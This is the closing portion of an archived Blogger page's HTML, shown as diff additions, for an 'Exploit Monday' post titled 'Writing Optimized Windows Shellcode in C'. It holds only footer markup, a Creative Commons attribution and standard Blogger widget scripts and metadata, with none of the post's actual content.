+<div class="cap-left"></div>
+<div class="cap-right"></div>
+</div>
+<div class="fauxborder-left footer-fauxborder-left">
+<div class="fauxborder-right footer-fauxborder-right"></div>
+<div class="region-inner footer-inner">
+<div class="foot no-items section" id="footer-1"></div>
+<!-- outside of the include in order to lock Attribution widget -->
+<div class="foot section" id="footer-3" name="Footer"><div class="widget HTML" data-version="1" id="HTML1">
+<div class="widget-content">
+<center><a rel="license" href="https://web.archive.org/web/20210305190309/http://creativecommons.org/licenses/by/3.0/"><img alt="Creative Commons License" style="border-width:0" src="./Writing Optimized Windows Shellcode in C_files/80x15.png"></a><br>This work by <a xmlns:cc="http://creativecommons.org/ns#" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2013/08/www.exploit-monday.com" property="cc:attributionName" rel="cc:attributionURL">Matthew Graeber</a> is licensed under a <a rel="license" href="https://web.archive.org/web/20210305190309/http://creativecommons.org/licenses/by/3.0/">Creative Commons Attribution 3.0 Unported License</a>.</center>
+</div>
+<div class="clear"></div>
+<span class="widget-item-control">
+<span class="item-control blog-admin">
+<a class="quickedit" onclick="return _WidgetManager._PopupConfig(document.getElementById(&quot;HTML1&quot;));" rel="nofollow" target="configHTML1" title="Edit">
+<img alt="" height="18" src="./Writing Optimized Windows Shellcode in C_files/icon18_wrench_allbkg.png" width="18">
+</a>
+</span>
+</span>
+<div class="clear"></div>
+</div><div class="widget Attribution" data-version="1" id="Attribution1">
+<div class="widget-content" style="text-align: center;">
+Picture Window theme. Powered by <a href="https://web.archive.org/web/20210305190309/https://www.blogger.com/" target="_blank">Blogger</a>.
+</div>
+<div class="clear"></div>
+<span class="widget-item-control">
+<span class="item-control blog-admin">
+<a class="quickedit" onclick="return _WidgetManager._PopupConfig(document.getElementById(&quot;Attribution1&quot;));" rel="nofollow" target="configAttribution1" title="Edit">
+<img alt="" height="18" src="./Writing Optimized Windows Shellcode in C_files/icon18_wrench_allbkg.png" width="18">
+</a>
+</span>
+</span>
+<div class="clear"></div>
+</div></div>
+</div>
+</div>
+<div class="footer-cap-bottom cap-bottom">
+<div class="cap-left"></div>
+<div class="cap-right"></div>
+</div>
+</div>
+</footer>
+<!-- content -->
+</div>
+</div>
+<div class="content-cap-bottom cap-bottom">
+<div class="cap-left"></div>
+<div class="cap-right"></div>
+</div>
+</div>
+</div>
+<script type="text/javascript">
+    window.setTimeout(function() {
+        document.body.className = document.body.className.replace('loading', '');
+      }, 10);
+  </script>
+
+<script type="text/javascript" src="./Writing Optimized Windows Shellcode in C_files/629644797-widgets.js.download"></script>
+<script type="text/javascript">
+window['__wavt'] = 'AOuZoY7Bnu2eThRFv8pZpVG53t0VnJAk-A:1614970989498';_WidgetManager._Init('//web.archive.org/web/20210305190309/http://www.blogger.com/rearrange?blogID\x3d6052198192158185644','//web.archive.org/web/20210305190309/http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html','6052198192158185644');
+_WidgetManager._SetDataContext([{'name': 'blog', 'data': {'blogId': '6052198192158185644', 'title': 'Exploit Monday', 'url': 'https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html', 'canonicalUrl': 'https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html', 'homepageUrl': 'https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/', 'searchUrl': 'https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/search', 'canonicalHomepageUrl': 'https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/', 'blogspotFaviconUrl': 'https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/favicon.ico', 'bloggerUrl': 'https://web.archive.org/web/20210305190309/https://www.blogger.com', 'hasCustomDomain': true, 'httpsEnabled': false, 'enabledCommentProfileImages': true, 'gPlusViewType': 'FILTERED_POSTMOD', 'adultContent': false, 'analyticsAccountNumber': '', 'encoding': 'UTF-8', 'locale': 'en', 'localeUnderscoreDelimited': 'en', 'languageDirection': 'ltr', 'isPrivate': false, 'isMobile': false, 'isMobileRequest': false, 'mobileClass': '', 'isPrivateBlog': false, 'isDynamicViewsAvailable': true, 'feedLinks': '\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22Exploit Monday - Atom\x22 href\x3d\x22http://www.exploit-monday.com/feeds/posts/default\x22 /\x3e\n\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/rss+xml\x22 title\x3d\x22Exploit Monday - RSS\x22 href\x3d\x22http://www.exploit-monday.com/feeds/posts/default?alt\x3drss\x22 /\x3e\n\x3clink rel\x3d\x22service.post\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22Exploit Monday - Atom\x22 href\x3d\x22https://www.blogger.com/feeds/6052198192158185644/posts/default\x22 /\x3e\n\n\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22Exploit Monday - Atom\x22 href\x3d\x22http://www.exploit-monday.com/feeds/299909111219502438/comments/default\x22 /\x3e\n', 'meTag': '', 'adsenseHostId': 'ca-host-pub-1556223355139109', 'adsenseHasAds': false, 'adsenseAutoAds': false, 'ieCssRetrofitLinks': '\x3c!--[if IE]\x3e\x3cscript type\x3d\x22text/javascript\x22 src\x3d\x22https://www.blogger.com/static/v1/jsbin/1277698886-ieretrofit.js\x22\x3e\x3c/script\x3e\n\x3c![endif]--\x3e', 'view': '', 'dynamicViewsCommentsSrc': '//web.archive.org/web/20210305190309/http://www.blogblog.com/dynamicviews/4224c15c4e7c9321/js/comments.js', 'dynamicViewsScriptSrc': '//web.archive.org/web/20210305190309/http://www.blogblog.com/dynamicviews/dee08f0e21edd08a', 'plusOneApiSrc': 'https://web.archive.org/web/20210305190309/https://apis.google.com/js/plusone.js', 'disableGComments': true, 'sharing': {'platforms': [{'name': 'Get link', 'key': 'link', 'shareMessage': 'Get link', 'target': ''}, {'name': 'Facebook', 'key': 'facebook', 'shareMessage': 'Share to Facebook', 'target': 'facebook'}, {'name': 'BlogThis!', 'key': 'blogThis', 'shareMessage': 'BlogThis!', 'target': 'blog'}, {'name': 'Twitter', 'key': 'twitter', 'shareMessage': 'Share to Twitter', 'target': 'twitter'}, {'name': 'Pinterest', 'key': 'pinterest', 'shareMessage': 'Share to Pinterest', 'target': 'pinterest'}, {'name': 'Email', 'key': 'email', 'shareMessage': 'Email', 'target': 'email'}], 'disableGooglePlus': true, 'googlePlusShareButtonWidth': 300, 'googlePlusBootstrap': '\x3cscript type\x3d\x22text/javascript\x22\x3ewindow.___gcfg \x3d {\x27lang\x27: \x27en\x27};\x3c/script\x3e'}, 'hasCustomJumpLinkMessage': false, 'jumpLinkMessage': 'Read more', 'pageType': 'item', 'postId': '299909111219502438', 'postImageThumbnailUrl': 'https://web.archive.org/web/20210305190309/http://3.bp.blogspot.com/-eEf1AMNqI4o/Ug6uHDAdU7I/AAAAAAAAAOY/gvcS7DibrMA/s72-c/x64_Optimized.png', 'postImageUrl': 'https://web.archive.org/web/20210305190309/http://3.bp.blogspot.com/-eEf1AMNqI4o/Ug6uHDAdU7I/AAAAAAAAAOY/gvcS7DibrMA/s1600/x64_Optimized.png', 'pageName': 'Writing Optimized Windows Shellcode in C', 'pageTitle': 'Exploit Monday: Writing Optimized Windows Shellcode in C'}}, {'name': 'features', 'data': {'sharing_get_link_dialog': 'true', 'sharing_native': 'false'}}, {'name': 'messages', 'data': {'edit': 'Edit', 'linkCopiedToClipboard': 'Link copied to clipboard!', 'ok': 'Ok', 'postLink': 'Post Link'}}, {'name': 'template', 'data': {'name': 'Picture Window', 'localizedName': 'Picture Window', 'isResponsive': false, 'isAlternateRendering': false, 'isCustom': false, 'variant': 'open', 'variantId': 'open'}}, {'name': 'view', 'data': {'classic': {'name': 'classic', 'url': '?view\x3dclassic'}, 'flipcard': {'name': 'flipcard', 'url': '?view\x3dflipcard'}, 'magazine': {'name': 'magazine', 'url': '?view\x3dmagazine'}, 'mosaic': {'name': 'mosaic', 'url': '?view\x3dmosaic'}, 'sidebar': {'name': 'sidebar', 'url': '?view\x3dsidebar'}, 'snapshot': {'name': 'snapshot', 'url': '?view\x3dsnapshot'}, 'timeslide': {'name': 'timeslide', 'url': '?view\x3dtimeslide'}, 'isMobile': false, 'title': 'Writing Optimized Windows Shellcode in C', 'description': 'Download: PIC_Bindshell   Introduction   I\u2019ll be the first to admit: writing shellcode sucks. While you have the advantage of employing some...', 'featuredImage': 'https://web.archive.org/web/20210305190309/http://3.bp.blogspot.com/-eEf1AMNqI4o/Ug6uHDAdU7I/AAAAAAAAAOY/gvcS7DibrMA/s1600/x64_Optimized.png', 'url': 'https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html', 'type': 'item', 'isSingleItem': true, 'isMultipleItems': false, 'isError': false, 'isPage': false, 'isPost': true, 'isHomepage': false, 'isArchive': false, 'isLabelSearch': false, 'postId': 299909111219502438}}]);
+_WidgetManager._RegisterWidget('_NavbarView', new _WidgetInfo('Navbar1', 'navbar', document.getElementById('Navbar1'), {}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_HeaderView', new _WidgetInfo('Header1', 'header', document.getElementById('Header1'), {}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_BlogView', new _WidgetInfo('Blog1', 'main', document.getElementById('Blog1'), {'cmtInteractionsEnabled': false, 'showBacklinks': true, 'postId': '299909111219502438', 'lightboxEnabled': true, 'lightboxModuleUrl': 'https://web.archive.org/web/20210305190309/https://www.blogger.com/static/v1/jsbin/2254753485-lbx.js', 'lightboxCssUrl': 'https://web.archive.org/web/20210305190309/https://www.blogger.com/static/v1/v-css/1050234869-lightbox_bundle.css'}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_TextView', new _WidgetInfo('Text1', 'sidebar-right-1', document.getElementById('Text1'), {}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_TextView', new _WidgetInfo('Text3', 'sidebar-right-1', document.getElementById('Text3'), {}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_BlogArchiveView', new _WidgetInfo('BlogArchive1', 'sidebar-right-1', document.getElementById('BlogArchive1'), {'languageDirection': 'ltr', 'loadingMessage': 'Loading\x26hellip;'}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_HTMLView', new _WidgetInfo('HTML1', 'footer-3', document.getElementById('HTML1'), {}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_AttributionView', new _WidgetInfo('Attribution1', 'footer-3', document.getElementById('Attribution1'), {}, 'displayModeFull'));
+</script>
+
+
+<link type="text/css" rel="stylesheet" href="./Writing Optimized Windows Shellcode in C_files/1050234869-lightbox_bundle.css"><script type="text/javascript" src="./Writing Optimized Windows Shellcode in C_files/2254753485-lbx.js.download"></script></body></html>
